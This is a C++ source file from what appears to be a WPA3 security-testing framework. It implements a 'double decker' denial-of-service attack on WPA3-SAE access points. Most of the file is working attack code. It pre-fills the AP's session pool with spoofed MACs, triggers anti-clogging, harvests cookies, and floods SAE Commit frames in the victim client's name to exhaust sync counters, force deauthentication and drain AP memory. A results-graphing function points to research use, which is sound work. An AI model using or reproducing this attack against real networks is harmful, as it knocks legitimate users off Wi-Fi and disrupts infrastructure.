#include "attacks/DoS_hard/double_decker/double_decker.h"

#include <atomic>
#include <thread>
#include <unistd.h>

#include "attacks/DoS_hard/PMK_gobbler/pmk_gobbler.h"
#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "attacks/DoS_hard/dos_helpers.h"
#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "attacks/sae_helper.h"
#include "config/RunStatus.h"
#include "interrupt.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "observer/station_counter.h"
#include "system/firmware/ath9k_htc.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::double_decker {

static vector<HWAddress<6>> build_pre_acm_pool(RunStatus &rs, const int pool_size, const bool use_connected_stas) {
	vector<HWAddress<6>> pool;
	const auto att_mac = rs.get_actor("attacker").get(SK::mac);
	if(use_connected_stas) {
		pool = dos_helpers::get_connected_stas(rs);
		pool.resize(min(static_cast<int>(pool.size()), pool_size));
		if(static_cast<int>(pool.size()) < pool_size) {
			log(LogLevel::WARNING, "Only {} connected STAs, padding with random MACs", pool.size());
			while(static_cast<int>(pool.size()) < pool_size)
				pool.emplace_back(firmware::get_rotating_ath_masker_mac(att_mac));
		}
	} else {
		pool.reserve(pool_size);
		for(int i = 0; i < pool_size; ++i)
			pool.emplace_back(firmware::get_rotating_ath_masker_mac(att_mac));
	}
	log(LogLevel::INFO, "Pre-ACM pool: {} MACs", pool.size());
	return pool;
}

// Muted Peer: repeatedly send Commit from client_mac + cookie so AP enters SAE state for that MAC,
// then AP retransmits its Commit to client_mac (ath_masker ACKs), exhausts dot11RSNASAESync, deauths.
static void muted_peer_burst(const string &att_iface, const string &att_mac,
	const HWAddress<6> &client_mac, const HWAddress<6> &ap_mac, pmk_gobbler::CookieStore &store,
	const int attack_time_sec, const sae_helper::SAEPair &sae_params, const size_t burst_size,
	const size_t fps, const int cookie_wait_ms) {
	auto [fd, addr] = bl0ck_attack::get_unblocking_socket(att_iface);
	log(LogLevel::INFO, "Muted Peer burst on {}, duration: {}s", client_mac, attack_time_sec);
	dos_helpers::timed_burst(fd, addr, attack_time_sec, burst_size, fps,
		[&]() -> optional<RadioTap> {
			optional<pmk_gobbler::ACMCookie> entry;
			{
				scoped_lock lock(store.mtx);
				if(!store.queue.empty()) {
					// prefer client_mac cookie (Muted Peer / Sync exhaustion),
					// fall back to any (memory exhaustion) — AP often skips ACM for
					// associated STAs so a client_mac cookie may never arrive
					auto it = store.queue.find(client_mac);
					if(it != store.queue.end())
						log(LogLevel::INFO, "Muted Peer: cookie for client {}", client_mac);
					else
						it = store.queue.begin();
					entry = std::move(it->second);
					store.queue.erase(it);
				}
			}
			// rotating trigger keeps cookie supply flowing (memory exhaustion)
			const auto rot_mac = firmware::get_rotating_ath_masker_mac(att_mac);
			const auto r_bytes = sae_helper::make_sae_commit(ap_mac, rot_mac, sae_params).serialize();
			sendto(fd, r_bytes.data(), r_bytes.size(), MSG_DONTWAIT,
				reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
			// client_mac trigger solicits a Muted Peer cookie when AP cooperates
			const auto t_bytes = sae_helper::make_sae_commit(ap_mac, client_mac, sae_params).serialize();
			sendto(fd, t_bytes.data(), t_bytes.size(), MSG_DONTWAIT,
				reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
			if(!entry) {
				interruptible_sleep(milliseconds(cookie_wait_ms));
				return nullopt;
			}
			auto p = sae_params;
			p.token = entry->token;
			return optional{ sae_helper::make_sae_commit(ap_mac, entry->sta_mac, p) };
		});
	close(fd);
	store.stop.store(true);
}

static void send_pre_acm_commits(const string &att_iface, const HWAddress<6> &ap_mac,
	const vector<HWAddress<6>> &pool, const sae_helper::SAEPair &sae_params) {
	auto [fd, addr] = bl0ck_attack::get_unblocking_socket(att_iface);
	for(const auto &mac : pool) {
		const auto bytes = sae_helper::make_sae_commit(ap_mac, mac, sae_params).serialize();
		sendto(fd, bytes.data(), bytes.size(), MSG_DONTWAIT,
			reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
	}
	close(fd);
	log(LogLevel::DEBUG, "Pre-ACM commits sent for {} MACs", pool.size());
}

void run_attack(RunStatus &rs) {
	const ActorPtr att = rs.get_actor("attacker");
	const ActorPtr ap = rs.get_actor("ap");
	const ActorPtr client = rs.get_actor("client");
	const HWAddress<6> client_mac = client.get(SK::mac);

	const auto &att_cfg = rs.config().at("attack_config");
	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
	const int acm_threshold = att_cfg.at("acm_threshold").get<int>();
	const int acm_pause_ms = att_cfg.at("acm_pause_millisec").get<int>();
	const int acm_trigger_count = att_cfg.at("acm_trigger_count").get<int>();
	const size_t burst_size = att_cfg.at("burst_size").get<size_t>();
	const size_t fps = att_cfg.at("frames_per_second_limit").get<size_t>();
	const int cookie_wait_ms = att_cfg.at("cookie_wait_ms").get<int>();
	const bool use_connected_stas = att_cfg.at("use_connected_stas").get<bool>();
	const int refresh_interval = att_cfg.at("refresh_pre_acm_interval_sec").get<int>();

	const HWAddress<6> ap_mac = ap.get(SK::mac);
	const string att_iface = att.get_mon_iface();

	log(LogLevel::INFO, "Probing supported DH groups...");
	auto sae_per_group = cookie_guzzler::get_commit_values_all_groups(rs, att_iface, ap_mac);
	if(sae_per_group.empty()) throw run_err("No supported DH groups found");

	vector<uint16_t> available_groups;
	for(const auto &[gid, _] : sae_per_group) available_groups.push_back(gid);
	ranges::sort(available_groups);
	log(LogLevel::INFO, "Supported groups: {}", available_groups.size());

	const sae_helper::SAEPair &base_params = sae_per_group.at(available_groups.front());

	const int pool_size = max(1, acm_threshold - 1);
	const vector<HWAddress<6>> pre_acm_pool = build_pre_acm_pool(rs, pool_size, use_connected_stas);

	rs.start_observers();
	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec").get<int>()));
	rs.process_manager.write_log_all(ATTACK_START_tag);

	// Phase 1: establish pre-ACM sessions (stays in AP memory for ~300s without refresh)
	send_pre_acm_commits(att_iface, ap_mac, pre_acm_pool, base_params);

	// Phase 2: trigger ACM — with pool_size pre-ACM sessions already committed, one more
	// unique MAC is enough to reach acm_threshold
	pmk_gobbler::trigger_acm(att_iface, att_iface, att.get(SK::mac), ap_mac,
		acm_pause_ms, acm_trigger_count, base_params, static_cast<int>(burst_size));
	rs.process_manager.write_log_all("@ACM_trigger");
	log(LogLevel::INFO, "ACM active; both pre- and post-ACM sessions now accumulate");

	pmk_gobbler::CookieStore store;
	thread capture_thread([&] {
		try {
			pmk_gobbler::capture_cookies(att_iface, ap_mac, store);
		} catch(const exception &e) {
			log(LogLevel::ERROR, "Cookie capture: {}", e.what());
			store.stop.store(true);
		}
	});

	// Optional refresh thread: re-send pre-ACM commits every refresh_interval seconds
	// to reset the inactivity timer on APs with short AP_MAX_INACTIVITY (<300s)
	atomic<bool> refresh_stop{false};
	thread refresh_thread;
	if(refresh_interval > 0) {
		refresh_thread = thread([&] {
			while(!refresh_stop.load()) {
				interruptible_sleep(seconds(refresh_interval));
				if(refresh_stop.load()) break;
				send_pre_acm_commits(att_iface, ap_mac, pre_acm_pool, base_params);
				log(LogLevel::DEBUG, "Pre-ACM sessions refreshed");
			}
		});
	}

	try {
		muted_peer_burst(att_iface, att.get(SK::mac), client_mac, ap_mac,
			store, attack_time, base_params, burst_size, fps, cookie_wait_ms);
	} catch(const exception &e) {
		log(LogLevel::ERROR, "muted_peer_burst: {}", e.what());
		refresh_stop.store(true);
		store.stop.store(true);
		if(capture_thread.joinable()) capture_thread.join();
		if(refresh_thread.joinable()) refresh_thread.join();
		throw;
	}

	rs.process_manager.write_log_all(ATTACK_STOP_tag);
	refresh_stop.store(true);
	store.stop.store(true);
	if(capture_thread.joinable()) capture_thread.join();
	if(refresh_thread.joinable()) refresh_thread.join();

	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec").get<int>()));
	ap->disconnect();
}

void stats_attack(const RunStatus &rs) {
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
	rs.log_events(elements, { { "client", "@ACM_trigger", "ACM trigger", "black" } });
	observer::station_counter::create_station_graph(rs, "ap", elements);
	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source), elements);
}
}
